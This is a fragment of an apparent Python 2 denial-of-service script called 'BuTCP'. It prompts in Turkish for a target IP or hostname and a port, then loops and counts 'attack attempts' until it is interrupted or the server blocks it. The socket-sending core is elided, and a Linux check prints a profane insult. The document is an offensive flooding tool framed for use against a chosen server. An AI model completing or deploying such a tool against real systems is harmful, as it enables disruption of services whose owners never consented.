...
if sys.platform == "linux" or sys.platform == "linux2":
    ...
    print("Bu Ne Orospu Evladi")


user_server = raw_input("\033[1;32m [BuTCP] IPv4 Veya DNS: \033[1;m")
user_port = input("\033[1;32m [BuTCP] Port: \033[1;m")
agent = []
count = 0
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                count += 1
                print ("\033[1;32m [BuTCP] Saldiri Girisi \033[1;m {0}".format(count))
            except KeyboardInterrupt:
                exit("\033[1;32m [BuTCP] Saldiri Durduruldu \033[1;m")
                break
            except socket.error:
                print ("\033[1;32m [BuTCP] Sunucu Tarafindan Engellendiniz. \033[1;32m")
                pass
